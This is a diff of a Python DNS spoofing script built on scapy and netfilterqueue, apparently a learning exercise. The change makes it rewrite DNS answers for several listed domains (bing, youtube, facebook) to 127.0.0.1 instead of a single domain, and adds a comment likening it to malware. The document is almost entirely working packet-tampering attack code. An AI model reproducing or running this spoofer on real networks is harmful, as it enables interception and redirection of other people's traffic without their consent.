@@ -1,3 +1,4 @@
+#yean this work on local machine like a malware
 import scapy.all as scapy
 import netfilterqueue 
 
@@ -7,10 +8,11 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload()) 
     if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
+       list_qnames = ['www.bing.com.','www.youtube.com.','www.facebook.com.']
        qname_d = qname.decode("utf")
        print(qname_d)
-       if qname_d == 'www.youtube.com.':
-            answer = scapy.DNSRR(rrname='www.youtube.com',rdata='127.0.0.1')
+       if qname_d in list_qnames:
+            answer = scapy.DNSRR(rrname=qname_d,rdata='127.0.0.1')
             print(qname_d)
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
